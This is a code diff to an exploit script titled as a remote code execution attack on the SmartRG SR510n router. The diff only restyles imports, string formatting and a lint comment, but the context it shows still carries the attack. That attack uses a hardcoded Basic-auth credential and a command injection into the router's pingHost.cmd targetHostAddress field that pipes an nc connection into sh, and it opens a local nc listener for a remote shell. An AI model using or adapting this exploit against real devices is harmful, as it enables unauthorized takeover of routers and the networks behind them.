@@ -1,8 +1,9 @@
 # Exploit Title: SmartRG Router SR510n 2.6.13 - RCE (Remote Code Execution)
 # done by Sathwik.R - www.github.com/cicada0007
 
+from subprocess import PIPE, Popen
+
 import requests
-from subprocess import Popen, PIPE
 
 router_host = "http://192.168.1.1"
 authorization_header = "YWRtaW46QWRtMW5ATDFtMyM="
@@ -28,7 +29,7 @@ def main():
             Popen(["nc", "-nlvp", f"{PAYLOAD_PORT}"], stdin=e_proc.stdout)
             send_payload(f"|nc {LOCAL_HOST} {PAYLOAD_PORT}|sh")
             print("done.. check shell")
-    except Exception as e:
+    except Exception as e:  # noqa: BLE001
         print(f"An error occurred: {e}")
 
 
@@ -45,9 +46,9 @@ def get_session():
 def send_payload(payload):
     print(payload)
     url = router_host + "/admin/pingHost.cmd"
-    headers = {"Authorization": "Basic {}".format(authorization_header)}
+    headers = {"Authorization": f"Basic {authorization_header}"}
     params = {"action": "add", "targetHostAddress": payload, "sessionKey": get_session()}
-    requests.get(url, headers=headers, params=params).text
+    requests.get(url, headers=headers, params=params)
 
 
 main()
